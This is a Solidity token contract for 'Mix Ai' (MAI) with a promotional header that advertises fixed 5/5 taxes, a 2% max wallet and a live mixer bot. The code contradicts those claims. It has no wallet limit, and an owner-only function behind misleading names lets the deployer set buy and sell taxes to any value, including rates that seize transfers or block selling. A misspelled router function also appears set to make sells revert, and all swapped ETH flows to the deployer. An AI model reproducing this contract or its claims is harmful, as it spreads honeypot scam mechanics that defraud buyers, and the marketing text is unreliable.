/*
➡️ Tax: 5/5
➡️ Supply: 1,000,000
➡️ Max wallet/ Txn: 2%
➡️ Liquidity: 2 Eth Which Will Be Locked Pre Launch

Our Bot Has Been Live For 24 Hours Now and is Ready to use here ➡️ Bot @MixAiTechBot (Utility Live & Working)
You Can View Our Current Stats On Our Mixer Above This Message! 

Telegram - https://t.me/mixaitech
Website - https://mixai.tech/
X - https://twitter.com/MixAiTech
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MAI {
    string public _name = unicode"Mix Ai";
    string public _symbol = unicode"MAI";
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1000000 * 10**decimals;

    struct StoreData {
        address tokenMkt;
        uint8 _TaxOnBuy;
        uint8 _TaxOnSell;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        uint8 _init_TaxOnBuy = 0;
        uint8 _init_TaxOnSell = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            _TaxOnBuy: _init_TaxOnBuy,
            _TaxOnSell: _init_TaxOnSell
        });
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function SetRuler(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _dataTokenMKTAuthencation()) revert Permissions();
        removeTax(_buy, _sell);
    }

    function removeTax(uint8 _buy, uint8 _sell) private {
        storeData._TaxOnBuy = _buy;
        storeData._TaxOnSell = _sell;
    }

    function _dataTokenMKTAuthencation() private view returns (address) {
        return storeData.tokenMkt;
    }

    function ChatLaunch() external {
        require(msg.sender == _dataTokenMKTAuthencation());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _dataTokenMKTAuthencation();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _initBuyFee, uint8 _initSellFee) = (
            storeData._TaxOnBuy,
            storeData._TaxOnSell
        );
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _initSellFee : _initBuyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}